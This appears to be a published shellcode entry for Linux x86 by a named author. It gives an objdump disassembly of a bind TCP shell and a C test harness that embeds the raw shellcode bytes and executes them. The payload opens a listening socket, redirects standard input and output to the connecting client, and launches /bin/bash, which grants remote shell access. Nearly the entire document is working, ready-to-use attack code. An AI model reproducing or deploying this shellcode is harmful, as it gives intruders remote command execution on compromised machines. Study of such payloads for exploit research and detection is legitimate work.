; Filename  : bind_tcp_shell.asm
; Author    : M.Acosta <amcx62[_at_]gmail[_dot_]com>
; Date      : 2013 August
; Location  : Lima(Peru)
; Desc      : Bind Tcp Shellcode
; Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

$ objdump -D bind_tcp_shell -M intel

bind_tcp_shell:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060: 31 db                	xor    ebx,ebx
 8048062:	b3 01                	mov    bl,0x1
 8048064:	6a 06                	push   0x6
 8048066:	6a 01                	push   0x1
 8048068:	6a 02                	push   0x2
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	89 e1                	mov    ecx,esp
 804806e:	31 c0                	xor    eax,eax
 8048070:	b0 66                	mov    al,0x66
 8048072:	cd 80                	int    0x80
 8048074:	89 c6                	mov    esi,eax
 8048076:	31 db                	xor    ebx,ebx
 8048078:	b3 02                	mov    bl,0x2
 804807a:	31 c9                	xor    ecx,ecx
 804807c:	51                   	push   ecx
 804807d:	66 68 20 60          	pushw  0x6020
 8048081:	66 6a 02             	pushw  0x2
 8048084:	89 e1                	mov    ecx,esp
 8048086:	6a 10                	push   0x10
 8048088:	51                   	push   ecx
 8048089:	56                   	push   esi
 804808a:	89 e1                	mov    ecx,esp
 804808c:	31 c0                	xor    eax,eax
 804808e:	b0 66                	mov    al,0x66
 8048090:	cd 80                	int    0x80
 8048092:	31 db                	xor    ebx,ebx
 8048094:	b3 04                	mov    bl,0x4
 8048096:	6a 01                	push   0x1
 8048098:	56                   	push   esi
 8048099:	89 e1                	mov    ecx,esp
 804809b:	31 c0                	xor    eax,eax
 804809d:	b0 66                	mov    al,0x66
 804809f:	cd 80                	int    0x80
 80480a1:	31 db                	xor    ebx,ebx
 80480a3:	b3 05                	mov    bl,0x5
 80480a5:	31 c9                	xor    ecx,ecx
 80480a7:	51                   	push   ecx
 80480a8:	51                   	push   ecx
 80480a9:	56                   	push   esi
 80480aa:	89 e1                	mov    ecx,esp
 80480ac:	31 c0                	xor    eax,eax
 80480ae:	b0 66                	mov    al,0x66
 80480b0:	cd 80                	int    0x80
 80480b2:	93                   	xchg   ebx,eax
 80480b3:	31 c9                	xor    ecx,ecx
 80480b5:	b1 02                	mov    cl,0x2

080480b7 <dup2_loop>:
 80480b7:	b0 3f                	mov    al,0x3f
 80480b9:	cd 80                	int    0x80
 80480bb:	fe c9                	dec    cl
 80480bd:	79 f8                	jns    80480b7 <dup2_loop>
 80480bf:	31 c0                	xor    eax,eax
 80480c1:	50                   	push   eax
 80480c2:	68 62 61 73 68       	push   0x68736162
 80480c7:	68 62 69 6e 2f       	push   0x2f6e6962
 80480cc:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 80480d1:	89 e3                	mov    ebx,esp
 80480d3:	50                   	push   eax
 80480d4:	89 e2                	mov    edx,esp
 80480d6:	53                   	push   ebx
 80480d7:	89 e1                	mov    ecx,esp
 80480d9:	b0 0b                	mov    al,0xb
 80480db:	cd 80                	int    0x80


#include<stdio.h>
#include<string.h>

#define PORT "\x20\x10"


unsigned char code[] = \
"\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x31\xc9\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc6\x31\xdb\xb3\x02\x31\xc9\x51\x66\x68"PORT"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x31\xdb\xb3\x04\x6a\x01\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x31\xdb\xb3\x05\x31\xc9\x51\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
   printf("Shellcode Length:  %d\n", strlen(code));
   int (*ret)() = (int(*)())code;
   ret();
}
